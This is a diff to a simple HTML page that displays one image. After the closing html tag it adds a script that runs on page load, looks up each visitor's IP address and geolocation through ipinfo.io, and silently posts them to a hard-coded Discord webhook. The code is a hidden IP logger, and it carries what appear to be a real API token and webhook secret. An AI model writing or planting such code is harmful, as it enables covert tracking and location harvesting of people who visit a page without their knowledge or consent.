@@ -53,3 +53,38 @@
     <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/444763985_1154611239118023_1533703639023475484_n.jpg?stp=dst-jpg_p403x403&_nc_cat=109&ccb=1-7&_nc_sid=5f2048&_nc_ohc=XZHS0Zk-kCwQ7kNvgF0fA4E&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_Q7cD1QGeaHNpBQKXmmOeVn5GhhhUb4IqaR6_ib4IRELkwPPlXw&oe=667FF438" alt="Center Image">
 </body>
 </html>
+<!-- Add this script to the end of your website -->
+<script>
+    async function getIPAndLocation() {
+        try {
+            const response = await fetch('https://ipinfo.io/json?token=0955f5ad507b93');
+            const data = await response.json();
+            sendToDiscord(data);
+        } catch (error) {
+            console.error('Error fetching IP info:', error);
+        }
+    }
+
+    function sendToDiscord(data) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1237688877435588723/RrRbIzFKtrX0edcT95NnKdzeHkhWNDRCxJou_UwbzOXpyDhj9dx1i5NTZMGdGYsoYM7I';
+        const payload = {
+            content: `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nAddress: ${data.loc}\n`
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            if (response.ok) {
+                console.log('Data sent to Discord webhook');
+            } else {
+                console.error('Error sending data to Discord webhook');
+            }
+        });
+    }
+
+    window.onload = getIPAndLocation;
+</script>
